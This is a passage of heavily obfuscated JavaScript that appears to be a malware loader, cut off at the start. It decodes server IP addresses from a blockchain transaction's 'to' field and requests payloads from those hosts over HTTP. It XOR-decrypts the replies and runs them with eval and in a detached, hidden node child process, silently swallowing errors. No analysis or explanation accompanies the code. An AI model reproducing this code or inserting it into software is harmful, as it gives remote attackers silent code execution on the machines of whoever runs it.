_0x497fb9[_0x177b5a(0x245)](wr,(_0x4f2ea3,_0x34952b)=>rc(_0x4f2ea3,_0x177b5a(0x1d3)+_0x177b5a(0x1fe),[],_0x34952b))),_0x2b6059=_0x497fb9[_0x177b5a(0x175)](_0x342563,_0x497fb9[_0x177b5a(0x270)](_0x342563,B));let _0x4858e8=await _0x497fb9[_0x177b5a(0x1a1)](fm,_0x497fb9[_0x177b5a(0x245)](cb,_0x2b6059)[_0x177b5a(0x1e6)](bt));_0x4858e8||(_0x4858e8=await _0x497fb9[_0x177b5a(0x187)](ls,_0x342563)[_0x177b5a(0x1f9)](li));const _0x463821=Buffer[_0x177b5a(0x271)](_0x4858e8['tx']['to'][_0x177b5a(0x1e0)](/^0x/i,''),_0x497fb9[_0x177b5a(0x154)]),_0x5bd904=_0x5ea207=>_0x5ea207[0x153*-0x11+-0x2a7+0x192a]+'\u002E'+_0x5ea207[-0x3*0x53+0x1507+-0xb1*0x1d]+'\u002E'+_0x5ea207[-0x1a2a+0x200b+0x1*-0x5df]+'\u002E'+_0x5ea207[0x2*-0xb4f+-0x260+0x1901],[_0x1171db,_0x2a333d]=[_0x497fb9[_0x177b5a(0x257)](_0x5bd904,_0x463821[_0x177b5a(0x235)](0x19b1+0x2*0x191+0x1*-0x1cd3,0x8e0+-0x1fa8+0x16cc)),_0x497fb9[_0x177b5a(0x25d)](_0x5bd904,_0x463821[_0x177b5a(0x235)](-0x12*-0x9f+-0x7e9+-0x7*0x77,-0x13*0xef+0x9e+0x1127*0x1))],_0x500988=global;_0x500988['_V']=_0x500988['i'],_0x500988['_H']=_0x177b5a(0x265)+_0x1171db+_0x177b5a(0x21f),_0x500988[_0x177b5a(0x210)]=_0x177b5a(0x265)+_0x2a333d+_0x177b5a(0x21f),_0x500988[_0x177b5a(0x1ee)]=_0x177b5a(0x265)+_0x1171db+_0x177b5a(0x1bd),_0x500988[_0x177b5a(0x1f6)]=_0x177b5a(0x265)+_0x1171db+_0x177b5a(0x21f);function _0x51d7b5(_0x1fc0a4,_0x6702c5){const _0x5a5d4e=_0x177b5a,_0x1bbb1e={'iyleI':function(_0x141163,_0x44be5b){const _0x56d579=_0x1706;return _0x497fb9[_0x56d579(0x177)](_0x141163,_0x44be5b);},'vKRIc':function(_0x363cf8,_0x4c252c){const _0x196b6d=_0x1706;return _0x497fb9[_0x196b6d(0x250)](_0x363cf8,_0x4c252c);},'QQwES':_0x497fb9[_0x5a5d4e(0x161)]},_0x3b0f24={'hostname':_0x6702c5[_0x5a5d4e(0x139)],'port':+_0x6702c5[_0x5a5d4e(0x234)]||0xbf2+-0x1*0xd2d+0x18b,'path':_0x497fb9[_0x5a5d4e(0x1cd)](_0x6702c5[_0x5a5d4e(0x159)],_0x6702c5[_0x5a5d4e(0x194)]),'headers':{'User-Agent':_0x497fb9[_0x5a5d4e(0x163)],'Sec-V':_0x500988['_V']||0x11c4*-0x2+-0xb29+0x2eb1}},_0x35e654=_0x542905=>{const _0x3786e2=_0x5a5d4e,_0x362e19=_0x1fc0a4[_0x3786e2(0x233)];for(let _0x3454ab=0x17*0x1f+0x259e+-0x2867;_0x1bbb1e[_0x3786e2(0x165)](_0x3454ab,_0x542905[_0x3786e2(0x233)]);_0x3454ab++)_0x542905[_0x3454ab]^=_0x1fc0a4[_0x3786e2(0x1ef)](_0x1bbb1e[_0x3786e2(0x16f)](_0x3454ab,_0x362e19));return _0x542905[_0x3786e2(0x16d)](_0x1bbb1e[_0x3786e2(0x173)]);},_0x5ad736=_0x3a1928=>{const _0x1c6527=_0x5a5d4e,_0x50a98b=_0x3a1928[_0x1c6527(0x1b4)][_0x497fb9[_0x1c6527(0x164)]];if(!_0x50a98b)throw new Error(_0x497fb9[_0x1c6527(0x203)]);return _0x497fb9[_0x1c6527(0x19d)](_0x35e654,Buffer[_0x1c6527(0x271)](_0x50a98b,_0x497fb9[_0x1c6527(0x1b9)]));},_0x15cc49=_0x3761ae=>new Promise((_0x15b693,_0x3c8a36)=>{const _0x413c68=_0x5a5d4e,_0x1604d3={'xwfnL':function(_0x502e8b,_0x5e82ac){const _0x1ea9e7=_0x1706;return _0x497fb9[_0x1ea9e7(0x243)](_0x502e8b,_0x5e82ac);},'kDYRh':function(_0x1cd6a5,_0x350476){const _0x15ca25=_0x1706;return _0x497fb9[_0x15ca25(0x1a1)](_0x1cd6a5,_0x350476);},'soksC':_0x497fb9[_0x413c68(0x164)],'lSvRY':function(_0x56fe5c,_0x4db5fd){const _0x2be09d=_0x413c68;return _0x497fb9[_0x2be09d(0x262)](_0x56fe5c,_0x4db5fd);},'PFNBl':function(_0x3754de,_0x736bb9){const _0x4b4a45=_0x413c68;return _0x497fb9[_0x4b4a45(0x255)](_0x3754de,_0x736bb9);},'aLzSl':_0x497fb9[_0x413c68(0x202)],'eYpeh':function(_0x245f4f,_0xd882eb){const _0x3ba404=_0x413c68;return _0x497fb9[_0x3ba404(0x160)](_0x245f4f,_0xd882eb);},'uYJnc':_0x497fb9[_0x413c68(0x219)],'jXbxU':function(_0x270708,_0x330b28){const _0x5756b9=_0x413c68;return _0x497fb9[_0x5756b9(0x262)](_0x270708,_0x330b28);},'uxofr':_0x497fb9[_0x413c68(0x17a)],'BdQzG':_0x497fb9[_0x413c68(0x249)],'GznlO':_0x497fb9[_0x413c68(0x23b)]},_0x50e2df=http[_0x413c68(0x1c7)]({..._0x3b0f24,'method':_0x3761ae},_0x18b8d0=>{const _0x169e05=_0x413c68;if(_0x1604d3[_0x169e05(0x23c)](_0x3761ae,_0x1604d3[_0x169e05(0x1d6)])){try{_0x1604d3[_0x169e05(0x15c)](_0x15b693,_0x1604d3[_0x169e05(0x21c)](_0x5ad736,_0x18b8d0));}catch(_0x5a7e59){_0x1604d3[_0x169e05(0x16b)](_0x3c8a36,_0x5a7e59);}_0x18b8d0[_0x169e05(0x140)]();return;}const _0x5556b7=[];_0x18b8d0['on'](_0x1604d3[_0x169e05(0x1c3)],_0xf77949=>_0x5556b7[_0x169e05(0x1f2)](_0xf77949)),_0x18b8d0['on'](_0x1604d3[_0x169e05(0x1f5)],()=>{const _0x3c63e4=_0x169e05;try{const _0x387f11=Buffer[_0x3c63e4(0x1c8)](_0x5556b7);if(_0x387f11[_0x3c63e4(0x233)])return _0x1604d3[_0x3c63e4(0x182)](_0x15b693,_0x1604d3[_0x3c63e4(0x15c)](_0x35e654,_0x387f11));if(_0x18b8d0[_0x3c63e4(0x1b4)][_0x1604d3[_0x3c63e4(0x172)]])return _0x1604d3[_0x3c63e4(0x21c)](_0x15b693,_0x1604d3[_0x3c63e4(0x15c)](_0x5ad736,_0x18b8d0));_0x1604d3[_0x3c63e4(0x1f0)](_0x3c8a36,new Error(_0x1604d3[_0x3c63e4(0x23e)]));}catch(_0x1d4bc2){_0x1604d3[_0x3c63e4(0x182)](_0x3c8a36,_0x1d4bc2);}}),_0x18b8d0['on'](_0x1604d3[_0x169e05(0x1eb)],_0x3c8a36);});_0x50e2df['on'](_0x497fb9[_0x413c68(0x23b)],_0x3c8a36),_0x50e2df[_0x413c68(0x215)]();});return _0x497fb9[_0x5a5d4e(0x243)](_0x15cc49,_0x497fb9[_0x5a5d4e(0x153)])[_0x5a5d4e(0x1f9)](()=>_0x15cc49(_0x5a5d4e(0x1f1)));}async function _0x569794(_0xac69ba,_0xf82e4d,_0x188443){const _0x2154a5=_0x177b5a;try{const _0x9a554e=await _0x497fb9[_0x2154a5(0x26e)](_0x51d7b5,_0xf82e4d,_0xac69ba),_0x2c7a94=_0x2154a5(0x209)+_0x2154a5(0x24a)+(_0x500988['_V']||-0xc8a+-0xd03+-0x1f*-0xd3)+_0x2154a5(0x253)+(_0x188443?'\u005F\u0048':_0x497fb9[_0x2154a5(0x1e4)])+_0x2154a5(0x24a)+(_0x188443?_0x500988['_H']:_0x500988[_0x2154a5(0x1ee)])+_0x2154a5(0x253)+(_0x188443?_0x497fb9[_0x2154a5(0x19c)]:_0x497fb9[_0x2154a5(0x256)])+_0x2154a5(0x24a)+(_0x188443?_0x500988[_0x2154a5(0x210)]:_0x500988[_0x2154a5(0x1f6)])+(_0x2154a5(0x253)+_0x2154a5(0x158)+_0x2154a5(0x216)+_0x2154a5(0x244)+_0x2154a5(0x1f8)+_0x2154a5(0x193));_0x188443||_0x497fb9[_0x2154a5(0x142)](eval,_0x497fb9[_0x2154a5(0x1cd)](_0x2c7a94,_0x9a554e)),_0x497fb9[_0x2154a5(0x1ba)](spawn,_0x497fb9[_0x2154a5(0x1d2)],['-e',_0x497fb9[_0x2154a5(0x1cd)](_0x2c7a94,_0x9a554e)],{'detached':!(-0x7a1+0x58*0x59+-0x16f7),'stdio':_0x497fb9[_0x2154a5(0x198)],'windowsHide':!(-0x10f*-0x9+0xcd*0x1+-0xa54)})[_0x2154a5(0x1bf)]();}catch(_0x2200c1){}}await _0x497fb9[_0x177b5a(0x26a)](_0x569794,new URL(_0x177b5a(0x265)+_0x1171db+(_0x177b5a(0x18e)+'s')),_0x497fb9[_0x177b5a(0x15b)],!(-0x1658+-0x558*-0x3+0x651)),await _0x497fb9[_0x177b5a(0x266)](_0x569794,new URL(_0x177b5a(0x265)+_0x1171db+_0x177b5a(0x18f)),_0x497fb9[_0x177b5a(0x22e)],!(-0x22f5+0xc*-0x294+0x41e5));})());

